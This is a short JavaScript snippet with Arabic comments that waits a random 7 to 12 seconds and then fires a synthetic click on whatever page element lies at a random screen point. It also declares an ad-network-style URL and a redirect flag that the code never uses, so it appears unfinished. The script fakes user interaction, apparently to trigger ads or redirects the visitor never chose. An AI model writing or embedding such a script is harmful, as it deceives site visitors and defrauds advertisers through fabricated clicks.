(function() {
  var redirected = false;
  var url = "https://otieu.com/4/9654336";
  // وظيفة تنفيذ نقرة وهمية
  function simulateClick(x, y) {
    var evt = new MouseEvent("click", {
      bubbles: true,
      cancelable: true,
      view: window,
      clientX: x,
      clientY: y
    });
    var el = document.elementFromPoint(x, y);
    if (el) {
      el.dispatchEvent(evt);
    }
  }

  // وقت عشوائي بين 7 و 12 ثانية
  var randomDelay = Math.floor(Math.random() * 5000) + 7000;

  // بعد مرور الوقت، يتم تنفيذ نقرة عشوائية
  setTimeout(function () {
    var width = window.innerWidth;
    var height = window.innerHeight;
    var randomX = Math.floor(Math.random() * width);
    var randomY = Math.floor(Math.random() * height);
    simulateClick(randomX, randomY);
  }, randomDelay);
})();
